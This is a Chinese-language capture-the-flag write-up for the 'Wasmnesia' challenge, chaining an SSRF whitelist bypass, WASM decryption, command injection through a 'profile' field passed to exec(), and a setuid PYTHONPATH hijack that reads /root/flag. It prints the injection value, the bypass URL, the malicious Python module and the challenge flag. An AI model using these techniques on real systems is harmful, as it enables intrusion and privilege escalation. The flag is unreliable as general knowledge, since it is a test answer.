# Reverse · Wasmnesia

## 结果

```text
flag{DN72WGbTvmLJU9JVX1o9GWLE9DiSZdarl3ixBDao}
```

## 攻击链概览

```text
登录
  -> SSRF 绕过 connectors/fetch 白名单
  -> 下载 formal.wexp
  -> 逆 AArch64 native context + WASM 变换
  -> 解出 EIPC 审计记录
  -> redrive profile 命令注入
  -> setuid edge-health + PYTHONPATH 劫持
  -> root 读取 /root/flag
```

## 1. SSRF 白名单绕过

`POST /api/v1/connectors/fetch` 只校验 URL 前缀。使用 userinfo：

```text
http://preview.reports.local@127.0.0.1:9090/internal/v1/artifacts/runs/job-f1234001/formal.wexp
```

浏览器/HTTP 客户端把 `preview.reports.local` 当作 userinfo，真实连接目标是
`127.0.0.1:9090`。下载的 `formal.wexp` 为：

```text
64B header + 16B tag + 1088B payload
payload offset = 0x50
```

## 2. WASM 还原

AArch64 诊断 ELF 中 `hostf` 返回：

```text
low  = 0x5bfdb480
high = 0xcba16580
```

`derive_seed([low, high, job, tenant, rev, batch])` 得到：

```text
seed = 0xc6adc3e6
```

WASM 的逆变换：

```text
out[i*64+k] = in[j*64+pos] ^ mix(seed, i*64+k)
```

其中 `n=(mix(seed,0)&15)+1`、`m=mix(seed,1)%17`、`shift=mix(seed,2)&63`。
早期从 0x40 解失败，正确 payload 起点是 0x50。

明文是一段 EIPC 审计记录：

```text
redrive_endpoint=/api/v1/operations/redrives
execution_id=job-f1234001
generation=5
input_sha256=5fc3d7d04a7842f9af0a18a3836622f60a37478249d07e668338beac3def7676
```

## 3. Redrive 命令注入

`server.js` 使用字符串拼接：

```js
exec("/usr/local/bin/edge-post --input " + file + " --profile " + profile)
```

将 profile 设为：

```text
archive-jsonl;<COMMAND>
```

即可在 ctf 用户下执行命令。

## 4. setuid 提权

`/usr/local/bin/edge-health` 是 setuid root ELF：

```text
setuid(0)
setenv("PYTHONPATH", "/app/workspace:/opt/edge")
python3 -c 'import edge_health; edge_health.run()'
```

`/app/workspace` 对 ctf 可写，因此写入恶意 `edge_health.py`：

```python
import pathlib
print(pathlib.Path("/root/flag").read_text())
```

执行 `edge-health` 后以 root 读取 flag。

## 复现命令

```powershell
python scripts/wasmnesia/fetch_formal.py --base "<TARGET_BASE>"
python scripts/wasmnesia/decrypt_formal.py
python scripts/wasmnesia/privesc.py --base "<TARGET_BASE>"
python scripts/wasmnesia/capture_flag.py --base "<TARGET_BASE>"
```

命令参数按实际附件和接口字段可能需微调；关键常量已写入脚本注释。

## 成功回显

```text
FILE /root/flag b'flag{DN72WGbTvmLJU9JVX1o9GWLE9DiSZdarl3ixBDao}\n'
CLEANED
```

## 证据

- `evidence/FLAG.txt`
- `evidence/rce_flag_output.txt`
- `evidence/formal.wexp`
- `evidence/formal_plain_0xc6adc3e6.bin`
- `evidence/ledger_shift.wasm`
- `evidence/edge-health`
